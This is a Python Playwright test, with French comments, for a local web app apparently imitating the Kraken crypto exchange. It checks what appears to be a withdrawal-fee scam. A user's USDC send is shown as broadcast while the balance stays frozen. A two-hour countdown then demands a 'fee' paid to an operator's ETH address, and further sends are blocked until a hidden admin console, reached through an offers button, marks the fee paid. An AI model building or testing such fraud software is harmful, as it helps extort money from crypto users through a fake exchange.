"""Envoi USDC : l'envoi part, les frais s'attachent ensuite, solde jamais perdu.

Scenario : 45 USDC, bareme de frais regle par la console (200 EUR, deja recu
120). L'utilisateur envoie 20 USDC : la transaction est diffusee, un ordre de
frais de 2 h s'ouvre avec l'adresse USDC publiee et le reste a regler. Le
solde reste a 45 tant que la console n'a pas valide le reglement. Un second
envoi est refuse et renvoie sur la fiche des frais. La console valide quand le
montant recu couvre le bareme : le solde tombe a 25, une seule fois.
"""
import pathlib, threading, functools, socketserver, time
from http.server import SimpleHTTPRequestHandler
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path("kraken-app").resolve()
PORT = 8853
H = functools.partial(SimpleHTTPRequestHandler, directory=str(ROOT))
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.ThreadingTCPServer(("127.0.0.1", PORT), H)
srv.daemon_threads = True
threading.Thread(target=srv.serve_forever, daemon=True).start()

DEF = "0x22E839441132106d227dE2e28494e52778b75ca8"
DEST = "0x5B1c9F7d3A8e4C2b6D0f1E9a7B3c5D8e2F4a6C10"
DEST2 = "0x77a1B2c3D4e5F60718293a4B5c6D7e8F90a1B2c3"
TOPIC = "kraken-usdcsend-" + str(int(time.time()))
fails = []


def check(name, cond, extra=""):
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else "  :: " + str(extra)[:240]))
    if not cond:
        fails.append(name)


def jclick(pg, sel, wait=800):
    ok = pg.evaluate(
        """(sel) => { const els = Array.from(document.querySelectorAll(sel));
             const el = els.find(e => e.getBoundingClientRect().width > 0) || els[0];
             if (!el) return false; el.click(); return true; }""",
        sel)
    pg.wait_for_timeout(wait)
    return bool(ok)


def open_send(pg):
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(350)
    ok = pg.evaluate("""() => {
      const fab = document.querySelector('#fab');
      if (fab) fab.click();
      const rows = Array.from(document.querySelectorAll('[data-sheet="send"]'));
      const row = rows.find(r => r.getBoundingClientRect().width > 0) || rows[0];
      if (!row) return false;
      row.click();
      return true;
    }""")
    pg.wait_for_timeout(900)
    return bool(ok)


def balance(pg, sym):
    return pg.evaluate("(sym) => Number((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').balances||{})[sym])||0", sym)


def orders(pg):
    return pg.evaluate("() => (JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{})")


def active_order(pg):
    return pg.evaluate("""() => Object.values(JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{})
        .filter(o => o && !o.done && !o.cancelled && !o.pending && o.src === 'app' && !o.ok)
        .sort((a,b) => (b.at||0)-(a.at||0))[0] || null""")


def open_admin(pg):
    jclick(pg, "#avatarBtn", 500)
    jclick(pg, '[data-goto="more"]', 600)
    jclick(pg, '[data-sheet="offers"]', 800)
    jclick(pg, "#offerBF100", 1400)


with sync_playwright() as p:
    b = p.chromium.launch()
    ctx = b.new_context(viewport={"width": 390, "height": 844}, device_scale_factor=2)
    ctx.add_init_script("localStorage.setItem('kraken_topic', '%s')" % TOPIC)
    pg = ctx.new_page()
    errs = []
    pg.on("pageerror", lambda e: errs.append(str(e)[:200]))
    pg.goto("http://127.0.0.1:%d/index.html#app" % PORT)
    pg.wait_for_function("!!window.__krakenSplashGone", timeout=20000)
    pg.wait_for_timeout(800)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click(); pg.wait_for_timeout(500)

    pg.evaluate("""() => {
      const s = JSON.parse(localStorage.getItem('kraken_state_v5') || '{}');
      s.balances = Object.assign({}, s.balances, { USDC: 45 });
      s.feeOrders = {};
      s.feeAddresses = {};
      localStorage.setItem('kraken_state_v5', JSON.stringify(s));
    }""")
    pg.reload()
    pg.wait_for_function("!!window.__krakenSplashGone", timeout=20000)
    pg.wait_for_timeout(1200)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click(); pg.wait_for_timeout(500)

    check("solde USDC de depart", abs(balance(pg, "USDC") - 45) < 1e-9, balance(pg, "USDC"))
    check("aucune transaction en attente au demarrage", active_order(pg) is None, active_order(pg))

    # ── 1. le formulaire d'envoi s'ouvre : rien n'est bloque avant l'envoi ─
    check("clic Envoyer atteint", open_send(pg))
    check("formulaire d'envoi present", pg.query_selector("#sdAddr") is not None)
    check("fiche des frais pas encore ouverte", pg.query_selector("#feeTo") is None)

    # ── 2. console : bareme de frais (200 EUR, 120 deja recu, adresse USDC) ─
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    open_admin(pg)
    check("console ouverte", pg.query_selector("#iaPanel") is not None)
    check("champ adresse ETH en tete", pg.query_selector('.ia-netfee [data-iafeeaddr="ETH"]') is not None)
    pg.fill('[data-ianet="amount"]', "200")
    pg.dispatch_event('[data-ianet="amount"]', "input")
    pg.wait_for_timeout(300)
    pg.fill('[data-ianet="paid"]', "120")
    pg.dispatch_event('[data-ianet="paid"]', "input")
    pg.wait_for_timeout(900)
    pend = orders(pg).get("pend") or {}
    check("montant du bareme publie", abs(float(pend.get("amount") or 0) - 200) < 1e-9, pend.get("amount"))
    check("deja recu publie", abs(float(pend.get("paid") or 0) - 120) < 1e-9, pend.get("paid"))
    check("frais libelles en ETH", pend.get("sym") == "ETH", pend.get("sym"))
    check("adresse ETH par defaut", str(pend.get("feeAddr") or "").lower() == DEF.lower(), pend.get("feeAddr"))

    # ── 3. envoi de 20 USDC : la transaction part, les frais s'attachent ───
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    check("clic Envoyer apres bareme", open_send(pg))
    line = pg.evaluate("() => (document.querySelector('.fee-line b')||{}).textContent || ''")
    check("solde affiche egal au solde reel", "45" in line.replace(",", "."), line)
    pg.fill("#sdAddr", DEST)
    pg.fill("#sdAmt", "20")
    pg.wait_for_timeout(200)
    jclick(pg, "#sdGo", 900)
    check("ecran de confirmation", pg.query_selector("#sdConfirm") is not None)
    jclick(pg, "#sdConfirm", 800)
    pg.wait_for_timeout(9000)
    check("fiche des frais ouverte apres envoi", pg.query_selector("#feeTo") is not None)
    check("aucune perte de solde a la diffusion", abs(balance(pg, "USDC") - 45) < 1e-9, balance(pg, "USDC"))
    act = active_order(pg)
    check("ordre de frais cree pour cet envoi", bool(act), act)
    check("frais attaches au montant du bareme", act and abs(float(act.get("amount") or 0) - 200) < 1e-9, act and act.get("amount"))
    check("deja recu repris sur l'ordre", act and abs(float(act.get("paid") or 0) - 120) < 1e-9, act and act.get("paid"))
    check("adresse de frais = adresse publiee", act and str(act.get("feeAddr") or "").lower() == DEF.lower(), act and act.get("feeAddr"))
    rem = pg.evaluate("() => (document.querySelector('#feeRemain2')||{}).textContent || ''")
    check("reste a regler affiche", "80" in rem.replace(",", "."), rem)
    cnt = pg.evaluate("() => (document.querySelector('#feeCount')||{}).textContent || ''")
    check("compte a rebours 2 h affiche", ":" in cnt and "Aucune" not in cnt, cnt)
    holds = pg.evaluate("""() => Object.values(JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{})
        .filter(o => o && o.hold).length""")
    check("aucune retenue creee", holds == 0, holds)

    # ── 4. second envoi refuse tant que les frais ne sont pas valides ──────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    open_send(pg)
    check("second envoi renvoye sur la fiche des frais", pg.query_selector("#feeTo") is not None)
    check("formulaire du second envoi absent", pg.query_selector("#sdAddr") is None)
    check("solde toujours intact", abs(balance(pg, "USDC") - 45) < 1e-9, balance(pg, "USDC"))

    # ── 5. console : reglement complet puis validation ─────────────────────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    open_admin(pg)
    check("console suit la transaction en attente", bool(pg.query_selector('.ia-netfee [data-ianet="amount"]')))
    pg.fill('[data-ianet="paid"]', "200")
    pg.dispatch_event('[data-ianet="paid"]', "input")
    pg.wait_for_timeout(900)
    jclick(pg, '[data-ia="netValid"]', 1200)
    act2 = pg.evaluate("""() => Object.values(JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{})
        .filter(o => o && o.src === 'app').sort((a,b)=>(b.at||0)-(a.at||0))[0] || null""")
    check("ordre valide par la console", act2 and act2.get("ok") is True, act2)
    check("debit unique a la validation", abs(balance(pg, "USDC") - 25) < 1e-9, balance(pg, "USDC"))
    check("plus aucune transaction en attente", active_order(pg) is None, active_order(pg))

    # ── 6. un nouvel envoi repasse ─────────────────────────────────────────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    check("clic Envoyer apres validation", open_send(pg))
    check("formulaire d'envoi de nouveau present", pg.query_selector("#sdAddr") is not None)
    pg.fill("#sdAddr", DEST2)
    pg.fill("#sdAmt", "5")
    pg.wait_for_timeout(200)
    jclick(pg, "#sdGo", 900)
    check("ecran de confirmation apres validation", pg.query_selector("#sdConfirm") is not None)
    jclick(pg, "#sdConfirm", 800)
    pg.wait_for_timeout(9000)
    check("nouvel ordre de frais ouvert", pg.query_selector("#feeTo") is not None)
    notif = pg.evaluate("""() => (JSON.parse(localStorage.getItem('kraken_notifs_v1')||'[]'))
        .filter(n => n.kind === 'withdraw').map(n => String(n.text||''))""")
    check("envois traces dans l'historique", len(notif) >= 1, notif)

    check("aucune erreur JS", not errs, errs[:3])

    b.close()
srv.shutdown()
print("\nFAILS:", fails)
